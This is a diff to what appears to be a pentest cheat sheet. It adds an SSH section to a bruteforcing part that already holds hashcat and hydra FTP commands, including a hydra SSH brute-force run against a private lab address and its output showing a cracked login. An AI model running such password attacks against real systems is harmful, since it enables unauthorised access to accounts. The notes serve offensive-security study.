@@ -98,8 +98,22 @@ hashcat -m 13100 --force hashes.txt rockyou.txt
 
 ### Bruteforcing
 
+FTP:
+
 ```
 hydra -l admin -P /usr/share/wordlists/rockyou.txt 192.168.78.56 ftp
+```
+
+SSH:
+
+```
+hydra -L users -P users 192.168.81.60 ssh -t 4
+Hydra v9.4 (c) 2022 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).
+
+Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2022-11-13 17:08:10
+[DATA] max 4 tasks per 1 server, overall 4 tasks, 9 login tries (l:3/p:3), ~3 tries per task
+[DATA] attacking ssh://192.168.81.60:22/
+[22][ssh] host: 192.168.81.60   login: eleanor   password: eleanor
 ```
 
 ## Wordlist generators
